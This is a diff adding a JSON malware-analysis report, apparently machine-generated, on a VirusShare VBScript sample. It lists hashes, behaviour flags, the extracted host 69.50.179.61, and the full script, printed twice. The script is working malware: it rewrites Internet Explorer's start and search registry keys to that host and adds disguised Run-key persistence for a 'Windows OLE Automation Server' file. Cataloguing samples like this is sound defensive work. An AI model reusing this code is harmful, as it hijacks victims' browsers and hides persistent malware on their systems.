@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nFilePath = WSHShell.ExpandEnvironmentStrings(\"%windir%\\system32\\ole32aut.vbe\")\nHomePage=\"http://69.50.179.61/search/\"\nSearchPage=\"http://69.50.179.61/search/se.html\"\nWSHShell.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", HomePage\nWSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\SearchURL\", HomePage\nWSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Page\", SearchPage\nWSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Bar\", SearchPage\nWSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL\", SearchPage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Start Page\", HomePage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\SearchURL\", HomePage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Page\", SearchPage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Bar\", SearchPage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL\", SearchPage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\SearchAssistant\", SearchPage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\CustomizeSearch\", SearchPage\nWSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs\\url1\", HomePage\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows OLE Automation Server\", FilePath\nWSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\Windows OLE Automation Server\", FilePath\nWSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows OLE Automation Server\", FilePath\n\n"
+    },
+    "filename": "VirusShare_2b54aa3fdfb2d5c0e25f82f11a182943",
+    "filesize": 1999,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2b54aa3fdfb2d5c0e25f82f11a182943",
+        "sha1": "ec8da51e35c0713560fe4fc5ee852b810648193f",
+        "sha256": "740f6afcbfc829264bacd9410c243834455bb8b4ae35bb02595a82ccd7b51fc9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "FilePath = WSHShell.ExpandEnvironmentStrings(\"%windir%\\system32\\ole32aut.vbe\")",
+            "HomePage=\"http://69.50.179.61/search/\"",
+            "SearchPage=\"http://69.50.179.61/search/se.html\"",
+            "WSHShell.RegWrite \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\", HomePage",
+            "WSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\SearchURL\", HomePage",
+            "WSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Page\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Bar\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Start Page\", HomePage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\SearchURL\", HomePage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Page\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Search Bar\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\SearchAssistant\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\CustomizeSearch\", SearchPage",
+            "WSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs\\url1\", HomePage",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows OLE Automation Server\", FilePath",
+            "WSHShell.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\Windows OLE Automation Server\", FilePath",
+            "WSHShell.RegWrite \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows OLE Automation Server\", FilePath"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "69.50.179.61"
+        ],
+        "url": [
+            "http://69.50.179.61/search/se.html",
+            "http://69.50.179.61/search/"
+        ]
+    },
+    "time": "0:00:00.292935",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
